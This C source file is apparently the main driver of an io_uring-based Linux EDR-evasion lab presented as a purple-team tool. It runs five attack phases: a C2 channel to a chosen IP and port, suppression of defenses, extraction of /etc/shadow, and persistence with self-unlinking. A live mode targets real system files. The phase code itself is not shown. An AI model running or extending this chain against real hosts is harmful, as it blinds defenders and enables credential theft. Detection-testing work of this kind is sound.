#include "evasion_lab.h"
#include <getopt.h>

lab_config_t g_config = {
    .mode = MODE_BENCHMARK,
    .phase = 0,
    .dry_run = 0,
    .safe_mode = 1,     /* Default is ON to ensure ethical/safe execution */
    .verbose = 0,
    .c2_ip = "127.0.0.1",
    .c2_port = DEFAULT_C2_PORT,
    .target_path = ""
};

void print_banner(void) {
    printf("====================================================================\n");
    printf("   Linux EDR Evasion & Telemetry Assessment Lab v%s\n", VERSION_STRING);
    printf("   Research Framework: io_uring & LD_PRELOAD Purple Team Evaluation\n");
    printf("====================================================================\n");
}

void print_help(const char *prog) {
    print_banner();
    printf("Usage: %s [OPTIONS]\n\n", prog);
    printf("Core Execution Modes:\n");
    printf("  -m, --mode <mode>        Execution mode:\n");
    printf("                             benchmark : Comprehensive telemetry gap test (Default)\n");
    printf("                             test-phase: Run an isolated attack phase (-p required)\n");
    printf("                             simulate  : Full Purple Team detection simulation\n");
    printf("                             cleanup   : Remove sandbox artifacts and reset\n\n");
    printf("Phase Selection:\n");
    printf("  -p, --phase <1-5|all>    Specify phase to execute (1 to 5, or all)\n");
    printf("                             1: io_uring Ring Init & Probe\n");
    printf("                             2: Asynchronous C2 Channel\n");
    printf("                             3: REAPER Defense Suppression\n");
    printf("                             4: Sensitive Telemetry Probe (Shadow extraction)\n");
    printf("                             5: Persistence Audit & Self-Unlink\n\n");
    printf("Safety & Environment Controls:\n");
    printf("  -s, --safe-mode          Target isolated sandbox " SAFE_SANDBOX " (Enabled by default)\n");
    printf("      --live-mode          Target live system files (/etc, /sys) [REQUIRES ROOT]\n");
    printf("  -d, --dry-run            Log planned SQE ring operations without executing\n");
    printf("  -c, --c2-ip <IP>         Target C2 IP for Phase 2 (Default: 127.0.0.1)\n");
    printf("      --port <PORT>        Target C2 Port (Default: 4444)\n");
    printf("  -v, --verbose            Enable detailed debug telemetry\n");
    printf("  -h, --help               Display this help guide\n\n");
    printf("Examples:\n");
    printf("  %s --mode benchmark --safe-mode\n", prog);
    printf("  %s --mode test-phase --phase 4 --dry-run\n", prog);
    printf("  %s --mode simulate --c2-ip 10.0.0.5\n", prog);
    printf("====================================================================\n");
}

void setup_safe_sandbox(void) {
    struct stat st;
    if (stat(SAFE_SANDBOX, &st) == -1) {
        mkdir(SAFE_SANDBOX, 0755);
    }
    /* Create mock files for safe testing */
    char path[512];
    snprintf(path, sizeof(path), "%s/shadow", SAFE_SANDBOX);
    FILE *f = fopen(path, "w");
    if (f) {
        fprintf(f, "root:$6$mockhash$mockmockmock:19000:0:99999:7:::\n");
        fprintf(f, "testuser:$6$mockhash2$mockmockmock:19000:0:99999:7:::\n");
        fclose(f);
    }

    snprintf(path, sizeof(path), "%s/tracing_on", SAFE_SANDBOX);
    f = fopen(path, "w");
    if (f) {
        fprintf(f, "1\n");
        fclose(f);
    }

    snprintf(path, sizeof(path), "%s/dummy_artifact.bin", SAFE_SANDBOX);
    f = fopen(path, "w");
    if (f) {
        fprintf(f, "MOCK_BINARY_DATA\n");
        fclose(f);
    }
}

void remove_safe_sandbox(void) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rm -rf %s", SAFE_SANDBOX);
    system(cmd);
    printf("[+] Sandbox %s cleaned up successfully.\n", SAFE_SANDBOX);
}

int main(int argc, char *argv[]) {
    static struct option long_options[] = {
        {"mode",      required_argument, 0, 'm'},
        {"phase",     required_argument, 0, 'p'},
        {"safe-mode", no_argument,       0, 's'},
        {"live-mode", no_argument,       0, 1001},
        {"dry-run",   no_argument,       0, 'd'},
        {"c2-ip",     required_argument, 0, 'c'},
        {"port",      required_argument, 0, 1002},
        {"verbose",   no_argument,       0, 'v'},
        {"help",      no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "m:p:sdc:vh", long_options, NULL)) != -1) {
        switch (opt) {
            case 'm':
                if (strcmp(optarg, "benchmark") == 0) g_config.mode = MODE_BENCHMARK;
                else if (strcmp(optarg, "test-phase") == 0) g_config.mode = MODE_TEST_PHASE;
                else if (strcmp(optarg, "simulate") == 0) g_config.mode = MODE_SIMULATE;
                else if (strcmp(optarg, "cleanup") == 0) g_config.mode = MODE_CLEANUP;
                else {
                    fprintf(stderr, "Unknown mode: %s\n", optarg);
                    return 1;
                }
                break;
            case 'p':
                if (strcmp(optarg, "all") == 0) g_config.phase = 0;
                else g_config.phase = atoi(optarg);
                break;
            case 's':
                g_config.safe_mode = 1;
                break;
            case 1001:
                g_config.safe_mode = 0;
                printf("[!] WARNING: LIVE MODE ENABLED. Real system paths will be targeted.\n");
                break;
            case 'd':
                g_config.dry_run = 1;
                break;
            case 'c':
                strncpy(g_config.c2_ip, optarg, sizeof(g_config.c2_ip) - 1);
                break;
            case 1002:
                g_config.c2_port = atoi(optarg);
                break;
            case 'v':
                g_config.verbose = 1;
                break;
            case 'h':
            default:
                print_help(argv[0]);
                return 0;
        }
    }

    if (g_config.mode == MODE_CLEANUP) {
        remove_safe_sandbox();
        return 0;
    }

    print_banner();

    if (g_config.safe_mode) {
        printf("[*] Environment: SAFE SANDBOX (%s)\n", SAFE_SANDBOX);
        setup_safe_sandbox();
    } else {
        printf("[!] Environment: LIVE HOST SYSTEM (Root privileges required for phases 3-5)\n");
    }

    if (g_config.dry_run) {
        printf("[*] Mode: DRY-RUN (Simulating submission queue requests without execution)\n");
    }

    struct io_uring ring;
    if (!g_config.dry_run) {
        if (uring_init(&ring, QUEUE_DEPTH) < 0) {
            fprintf(stderr, "[-] Fatal: io_uring is unsupported or restricted by current kernel.\n");
            return 1;
        }
    }

    /* Execute selected phase or entire chain */
    if (g_config.mode == MODE_TEST_PHASE && g_config.phase > 0) {
        printf("[*] Executing Target Phase %d...\n", g_config.phase);
        switch (g_config.phase) {
            case 1: phase1_init_recon(&ring); break;
            case 2: phase2_c2_channel(&ring, g_config.c2_ip, g_config.c2_port); break;
            case 3: phase3_defense_suppression(&ring); break;
            case 4: phase4_telemetry_probe(&ring); break;
            case 5: phase5_persistence_cleanup(&ring); break;
            default: fprintf(stderr, "Invalid phase: %d\n", g_config.phase); break;
        }
    } else {
        /* Run all phases */
        printf("[*] Executing Full 5-Phase Telemetry Assessment Chain...\n");
        phase1_init_recon(&ring);
        phase2_c2_channel(&ring, g_config.c2_ip, g_config.c2_port);
        phase3_defense_suppression(&ring);
        phase4_telemetry_probe(&ring);
        phase5_persistence_cleanup(&ring);
    }

    if (!g_config.dry_run) {
        uring_cleanup(&ring);
    }

    printf("\n[+] Telemetry Assessment Execution Completed.\n");
    printf("[*] Check your Elastic Defend / Kibana Alerts against Rules 1-13.\n");
    return 0;
}
